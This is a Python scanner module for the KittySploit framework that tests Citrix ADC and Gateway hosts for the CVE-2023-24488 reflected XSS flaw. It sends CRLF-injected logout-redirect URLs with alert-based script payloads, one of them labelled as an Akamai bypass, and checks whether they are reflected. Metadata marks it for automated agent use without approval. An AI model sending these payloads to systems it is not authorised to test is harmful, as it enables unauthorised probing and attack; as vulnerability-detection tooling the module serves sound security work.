#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Citrix ADC and Citrix Gateway versions before 13."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Citrix Gateway and Citrix ADC - Cross-Site Scripting Detection',
        'description': 'Citrix ADC and Citrix Gateway versions before 13.1 and 13.1-45.61, 13.0 and 13.0-90.11, 12.1 and 12.1-65.35 contain a cross-site scripting vulnerability due to improper input validation.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'citrix', 'xss', 'adc', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://support.citrix.com/article/CTX477714/citrix-adc-and-citrix-gateway-security-bulletin-for-cve202324487-cve202324488',
            'https://blog.assetnote.io/2023/06/29/citrix-xss-advisory/',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-24488',
            'https://twitter.com/infosec_au/status/1674786106381070342',
            'https://twitter.com/bxmbn/status/1675250259608449026',
        ],
        'cve': 'CVE-2023-24488',
    }

    def run(self):
        for path in ('/oauth/idp/logout?post_logout_redirect_uri=%0D%0A%0D%0A%3Cbody+x=%27&%27onload=%22(alert)(%27citrix+akamai+bypass%27)%22%3E', '/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 302:
                continue
            body = r.text or ""
            body_any = ('<body x=\'&\'onload="(alert)(\'citrix akamai bypass\')">', '<script>alert(document.domain)</script>', 'Content-Type: text/html',)
            if (any(m in body for m in body_any)):
                self.set_info(
                    severity='medium',
                    reason="Citrix Gateway and Citrix ADC - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

